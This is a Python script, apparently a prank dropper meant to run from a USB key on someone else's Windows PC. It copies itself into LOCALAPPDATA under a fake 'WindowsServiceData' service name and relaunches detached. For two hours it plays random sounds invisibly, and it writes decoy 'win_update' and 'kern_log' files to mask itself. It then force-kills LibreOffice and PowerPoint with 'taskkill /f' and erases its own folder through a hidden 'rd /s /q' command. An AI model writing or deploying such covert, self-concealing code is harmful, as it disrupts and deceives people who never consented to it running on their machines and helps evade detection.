import atexit
import ctypes
import ctypes
import datetime
import os
import random
import shutil
import string
import subprocess
import sys
import threading
import time
from pathlib import Path

try:
    import pygame
except ImportError:
    pygame = None
try:
    import winsound
except Exception:
    winsound = None

# --- CONFIGURATION DES CHEMINS ---
TEMP_DIR = Path(os.environ.get("LOCALAPPDATA", r"C:\Temp")) / "WindowsServiceData"
NOM_SCRIPT = "service_task.py"
NOM_DIAPO = "tx.odp"
NOM_DOSSIER_SONS = "sons_data"

# Chemins cibles sur le PC
DIAPO_DEST = TEMP_DIR / NOM_DIAPO
SONS_DEST = TEMP_DIR / NOM_DOSSIER_SONS
SCRIPT_DEST = TEMP_DIR / NOM_SCRIPT
PID_FILE = TEMP_DIR / ".service_task.pid"
STOP_EVENT = threading.Event()

# Timing des sons
SOUND_DELAY = 0.5 * 60
SOUND_INTERVAL_MIN = 15.0
SOUND_INTERVAL_MAX = 20.0


def _copy_file_with_retry(src: Path | str, dst: Path | str, attempts: int = 3, wait_seconds: float = 0.5) -> bool:
    src_path = Path(src)
    dst_path = Path(dst)
    for attempt in range(1, attempts + 1):
        try:
            if dst_path.exists():
                try:
                    dst_path.unlink()
                except OSError:
                    pass
            shutil.copy2(str(src_path), str(dst_path))
            return True
        except PermissionError:
            if attempt == attempts:
                raise
            time.sleep(wait_seconds)
        except OSError as exc:
            if attempt == attempts or getattr(exc, "winerror", None) != 32:
                raise
            time.sleep(wait_seconds)
    return False


def _read_pid_file() -> int | None:
    try:
        return int(PID_FILE.read_text(encoding="utf-8").strip())
    except Exception:
        return None


def _is_process_running(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except OSError:
        return False
    return True


def _temp_instance_is_running() -> bool:
    pid = _read_pid_file()
    if pid is None:
        return False
    if not _is_process_running(pid):
        try:
            PID_FILE.unlink()
        except OSError:
            pass
        return False
    return True


def _cleanup_pid_file() -> None:
    try:
        PID_FILE.unlink()
    except OSError:
        pass


def _register_pid_file() -> None:
    TEMP_DIR.mkdir(parents=True, exist_ok=True)
    PID_FILE.write_text(str(os.getpid()), encoding="utf-8")
    atexit.register(_cleanup_pid_file)


def _get_default_app_command_for_extension(ext: str) -> str | None:
    """Return the ftype command string for a given extension (Windows), or None.

    Uses `assoc` then `ftype` via cmd to determine the program used to open the extension.
    """
    try:
        # assoc .ext -> FileType
        r = subprocess.run(["cmd", "/c", f"assoc {ext}"], capture_output=True, text=True)
        out = r.stdout.strip()
        if "=" not in out:
            return None
        filetype = out.split("=", 1)[1]
        r2 = subprocess.run(["cmd", "/c", f"ftype {filetype}"], capture_output=True, text=True)
        out2 = r2.stdout.strip()
        if "=" not in out2:
            return None
        cmd = out2.split("=", 1)[1]
        return cmd
    except Exception:
        return None


def _mci_send_command(command: str) -> int:
    return ctypes.windll.winmm.mciSendStringW(command, None, 0, None)


def _play_sound_invisible(file_path: str) -> str | None:
    if winsound is not None and file_path.lower().endswith(".wav"):
        try:
            winsound.PlaySound(file_path, winsound.SND_FILENAME | winsound.SND_ASYNC)
            return None
        except Exception:
            pass

    alias = f"sound_{int(time.time() * 1000)}"
    try:
        if _mci_send_command(f'open "{file_path}" alias {alias}') != 0:
            return None
        if _mci_send_command(f'play {alias}') != 0:
            _mci_send_command(f'close {alias}')
            return None
        return alias
    except Exception:
        return None


def _close_sound_alias(alias: str) -> None:
    try:
        _mci_send_command(f'close {alias}')
    except Exception:
        pass


def generer_bruit_logs() -> None:
    prefixes = ["sys_check", "win_update", "kern_log"]
    TEMP_DIR.mkdir(parents=True, exist_ok=True)

    for _ in range(20):
        name = f"{random.choice(prefixes)}_{''.join(random.choices(string.digits, k=4))}.log"
        path = TEMP_DIR / name
        try:
            path.write_text(f"{datetime.datetime.now()} [INFO] System heartbeat OK\n", encoding="utf-8")
        except OSError:
            continue


def jouer_sons_aleatoires(stop_event: threading.Event, first_play_at: float | None = None, min_interval: float = SOUND_INTERVAL_MIN, max_interval: float = SOUND_INTERVAL_MAX) -> None:
    # Prefer pygame when available
    if pygame is None:
        # Fallback mode when pygame is not available.
        # Use winsound for WAV files, and invisible MCI playback for other supported formats.
        if not SONS_DEST.exists():
            return

        extensions = (".mp3", ".wav", ".ogg", ".m4a")
        liste_sons = [p for p in SONS_DEST.iterdir() if p.suffix.lower() in extensions and p.is_file()]
        if not liste_sons:
            return

        # Wait until the scheduled first play time
        while first_play_at is not None and not stop_event.is_set():
            remaining = first_play_at - time.monotonic()
            if remaining <= 0:
                break
            stop_event.wait(min(remaining, 0.5))

        while not stop_event.is_set():
            alias: str | None = None
            try:
                son = random.choice(liste_sons)
                file_path = str(son)
                print(f"soundboard: playing (fallback) {file_path}")
                alias = _play_sound_invisible(file_path)
                if alias is None and not file_path.lower().endswith(".wav"):
                    print(f"soundboard: lecture invisible non disponible pour {file_path}")
            except Exception:
                pass

            if stop_event.is_set():
                if alias:
                    _close_sound_alias(alias)
                break

            interval = random.uniform(min_interval, max_interval)
            print(f"soundboard: next sound in {interval:.1f} seconds")
            stop_event.wait(interval)

            if alias:
                _close_sound_alias(alias)
        return

    if not SONS_DEST.exists():
        return

    try:
        pygame.mixer.pre_init(44100, -16, 2, 2048)
        pygame.mixer.init()
    except Exception:
        try:
            pygame.mixer.quit()
        except Exception:
            pass
        return

    extensions = (".mp3", ".wav", ".ogg", ".m4a")
    liste_sons = [p for p in SONS_DEST.iterdir() if p.suffix.lower() in extensions and p.is_file()]
    if not liste_sons:
        try:
            pygame.mixer.quit()
        except Exception:
            pass
        return

    # Wait until the scheduled first play time
    while first_play_at is not None and not stop_event.is_set():
        remaining = first_play_at - time.monotonic()
        if remaining <= 0:
            break
        stop_event.wait(min(remaining, 0.5))

    if stop_event.is_set():
        try:
            pygame.mixer.quit()
        except Exception:
            pass
        return

    while not stop_event.is_set():
        try:
            son_choisi = random.choice(liste_sons)
            file_path = str(son_choisi)
            print(f"soundboard: playing (pygame) {file_path}")
            pygame.mixer.music.load(file_path)
            pygame.mixer.music.play()
            while pygame.mixer.music.get_busy() and not stop_event.is_set():
                stop_event.wait(0.5)
        except Exception:
            pass

        if stop_event.is_set():
            break

        interval = random.uniform(min_interval, max_interval)
        print(f"soundboard: next sound in {interval:.1f} seconds")
        stop_event.wait(interval)
    try:
        pygame.mixer.music.stop()
    except Exception:
        pass
    try:
        pygame.mixer.quit()
    except Exception:
        pass


def stop_presentation() -> None:
    targets = ["soffice.bin", "soffice.exe", "simpress.exe", "powerpnt.exe"]
    for process_name in targets:
        subprocess.run(
            ["taskkill", "/f", "/im", process_name, "/t"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False,
        )


def mission() -> None:
    _register_pid_file()

    total_seconds = 2 * 60 * 60
    play_at = time.monotonic() + SOUND_DELAY
    print(
        f"mission: running for {total_seconds} seconds, first sound after {SOUND_DELAY} seconds, "
        f"then every {SOUND_INTERVAL_MIN:.1f}-{SOUND_INTERVAL_MAX:.1f} seconds"
    )

    audio_thread = threading.Thread(
        target=jouer_sons_aleatoires,
        args=(STOP_EVENT, play_at, SOUND_INTERVAL_MIN, SOUND_INTERVAL_MAX),
        daemon=True,
    )
    audio_thread.start()

    generer_bruit_logs()

    if DIAPO_DEST.exists():
        try:
            os.startfile(str(DIAPO_DEST))
        except OSError:
            pass

    time.sleep(total_seconds)
    stop_presentation()

    STOP_EVENT.set()
    audio_thread.join(timeout=5)

    cmd_del = f'timeout /t 5 & rd /s /q "{TEMP_DIR}"'
    subprocess.Popen(
        cmd_del,
        shell=True,
        creationflags=0x08000000,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    sys.exit(0)

def installer_et_lancer() -> bool:
    current_script = Path(__file__).resolve()
    if current_script.parent.resolve() == TEMP_DIR.resolve():
        return False

    if _temp_instance_is_running():
        print("Une instance est déjà en cours. Sortie.")
        return True

    TEMP_DIR.mkdir(parents=True, exist_ok=True)

    _copy_file_with_retry(current_script, SCRIPT_DEST)

    source_diapo = current_script.parent / NOM_DIAPO
    if source_diapo.exists():
        try:
            _copy_file_with_retry(source_diapo, DIAPO_DEST)
        except OSError:
            print(f"Warning: unable to copy {source_diapo} to {DIAPO_DEST}")

    source_sons = current_script.parent / NOM_DOSSIER_SONS
    if source_sons.exists():
        if SONS_DEST.exists():
            shutil.rmtree(str(SONS_DEST))
        shutil.copytree(str(source_sons), str(SONS_DEST))

    subprocess.Popen(
        [sys.executable, str(SCRIPT_DEST)],
        creationflags=0x00000008,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        shell=False,
    )
    print("Installation terminée. Vous pouvez retirer la clé.")
    return True


if __name__ == "__main__":
    if not installer_et_lancer():
        mission()
